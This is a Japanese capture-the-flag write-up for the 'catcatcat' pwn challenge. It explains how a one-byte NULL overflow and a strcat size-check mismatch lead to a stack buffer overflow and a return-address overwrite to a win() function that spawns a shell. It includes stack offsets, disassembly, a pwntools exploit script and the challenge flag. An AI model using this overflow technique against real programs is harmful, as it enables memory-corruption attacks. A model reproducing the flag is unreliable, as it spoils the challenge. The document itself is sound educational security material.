# catcatcat - WRITEUP

## 問題概要

- ジャンル: Pwn (ユーザーランド)
- タイトル: catcatcat
- フラグ: `TSGCTF{pl34s3_d0n7_7ry_c0pyf4il_in_7h3_c0n74in3r_XD}`

問題文の "Godisnowhere" は「God is now here」「God is nowhere」どちらにも読める。これは strcat が null 終端を見る場所（"here"）と size チェックが見る場所（"nowhere"）が違うことの暗喩。

## バイナリのセキュリティ機構

```
$ file chal
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ gcc flags: -fno-stack-protector -no-pie
```

- NX: 有効
- PIE: 無効（アドレス固定）
- Stack Canary: 無効
- RELRO: partial

## 脆弱性分析

### 構造体レイアウト

```c
#define PAGE_SIZE 512
#define NUM_PAGES 3

struct {
    size_t size;       // 8 bytes
    char content[512]; // 512 bytes
} pages[NUM_PAGES];    // 合計 520 bytes/要素
```

### 脆弱性1: 1バイト NULL オーバーフロー（size=512 のとき）

```c
fgets(pages[index].content, size+1, stdin);
```

`size=512` を指定すると `fgets(content, 513, stdin)` が最大 512 バイト読み込み、**content[512]** に NULL (\x00) を書く。
しかし `content` は 512 バイトしかないため、`content[512]` は **次の構造体要素の先頭 = `pages[index+1].size` の LSB** にあたる。

例: `pages[1].size = 511 = 0x1FF` の状態で `pages[0]` に 512 バイト書くと、
LSB がゼロ化されて `pages[1].size = 256 = 0x100` になる。

### 脆弱性2: size と実際コンテンツ長の乖離

連結処理のサイズチェックは `pages[i].size`（ユーザー指定値）を使うが、
実際のコピーは `strcat` が NULL 終端まで行う。

```c
// チェック: pages[i].size の合計を使う
if (overall_size > sizeof(buf)) { ... }

// コピー: 実際の文字列長（NULL終端まで）を使う
strcat(buf, pages[i].content);
```

## 攻撃手順

### バッファの位置とリターンアドレス

`app()` のスタックフレーム（アセンブリ解析より）:

```
[rbp + 8]    = リターンアドレス（buf 先頭から +1064 = 0x428）
[rbp]        = saved rbp
[rbp - 8]    = saved rbx
...
[rbp - 0x420] = buf[0]  （buf は 1024 バイト）
```

### 攻撃フロー

1. **Step 1**: page[1] に size=511 で 511 バイト書き込む
   - `pages[1].size = 511 (0x1FF)`
   - `pages[1].content` = 511 文字

2. **Step 2**: page[0] に size=512 で 512 バイト書き込む → NULL オーバーフロー
   - `fgets` が `pages[0].content[512]` = `pages[1].size[0]` に `\x00` を書く
   - `pages[1].size`: `0x1FF` → `0x100 = 256`
   - `pages[0].size = 512` はそのまま

3. **Step 3**: page[2] に size=44 で payload を書き込む
   ```
   payload = b'C' * 41 + win_addr[:3]
   ```

4. **Step 4**: 連結（choice=2）実行
   - `overall_size = 512 + 256 + 44 = 812 ≤ 1024` → チェック通過
   - strcat の実際のコピー量: `512 + 511 + 44 = 1067 バイト`
   - `buf` は 1024 バイトなので **43 バイトのオーバーフロー**

   ```
   buf[0   .. 511 ] = pages[0].content (512 bytes, 'B'*512)
   buf[512 .. 1022] = pages[1].content (511 bytes, 'A'*511)
   buf[1023.. 1066] = pages[2].content (44 bytes, payload)
   buf[1067]        = \x00  (strcat null terminator)
   ```

   - `buf[1056..1063]` (saved rbp) → 'C'*8 に上書き（garbled）
   - `buf[1064..1066]` (return addr bytes 0-2) → `win()` アドレスの下位3バイト
   - `buf[1067]` = `\x00` = return addr byte 3 (もともと 0x00)
   - `buf[1068..1071]` = 元のリターンアドレスの上位バイト（もともと 0x00）

5. **Step 5**: exit（choice=3）実行
   - `app()` がリターン → `ret` で `win()` にジャンプ
   - `win()` が `system("/bin/sh")` を実行 → シェル獲得

### スタックアライメント修正

`ret` でジャンプした場合、通常の `call` と異なり RSP が 8 バイトずれる（`call` はリターンアドレスをプッシュするため）。
この状態で `win()` の冒頭（`push rbp`）に着地すると、`system()` 内の `movaps` 命令で SIGSEGV が発生する。

**修正**: `win()+5 = 0x40123b`（`push rbp` をスキップした `mov rsp, rbp`）にジャンプする。
これにより RSP のアライメントが正しく保たれる。

```
win() = 0x401236:
  0x401236: endbr64       (4 bytes)
  0x40123a: push rbp      (1 byte) ← スキップ
  0x40123b: mov rsp, rbp           ← ここに飛ぶ
  ...
  0x40125c: call system@plt
```

## exploit.py 概要

```python
WIN_ADDR = 0x40123b  # win()+5 (push rbp をスキップ)

# Step1: page[1] に 511 バイト書き込み
edit_page(r, 1, b'A' * 511)

# Step2: page[0] に 512 バイト書き込み → NULL overflow → pages[1].size = 256
r.sendlineafter(b"size > ", b"512")
r.sendlineafter(b"content > ", b'B' * 512)

# Step3: page[2] に payload (41バイトpadd + win addr 3バイト)
payload = b'C' * 41 + p64(WIN_ADDR)[:3]
edit_page(r, 2, payload)

# Step4: 連結でバッファオーバーフロー
r.sendlineafter(b"choice > ", b"2")

# Step5: exit でリターン → win() → shell
r.sendlineafter(b"choice > ", b"3")
```

## フラグ

```
TSGCTF{pl34s3_d0n7_7ry_c0pyf4il_in_7h3_c0n74in3r_XD}
```
